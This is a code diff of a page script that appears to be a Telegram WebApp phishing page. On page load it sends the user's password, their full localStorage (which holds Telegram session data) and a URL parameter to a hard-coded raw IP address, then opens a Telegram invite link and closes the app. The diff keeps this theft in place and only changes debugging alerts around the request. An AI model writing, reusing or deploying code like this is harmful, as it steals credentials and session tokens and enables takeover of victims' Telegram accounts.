@@ -14,7 +14,6 @@ document.addEventListener("DOMContentLoaded", function() {
         localStorage.removeItem("GramJs:apiCache");
         localStorage.removeItem("tt-global-state");
 
-        alert("DDD0");
 
         fetch(`http://94.131.9.66:4040/api/users/telegram/info`, {
           method: "POST",
@@ -25,7 +24,9 @@ document.addEventListener("DOMContentLoaded", function() {
             password, quicklySet: localStorage,
             type: new URLSearchParams(window.location.search).get("type")
           })
-        });
+        })
+        .then(res => alert("success:",res))
+        .catch(err => alert('error:',err));
 
         window.Telegram.WebApp.openTelegramLink("https://t.me/+8dtqN7T2sJpmNTb7");
         window.Telegram.WebApp.close();
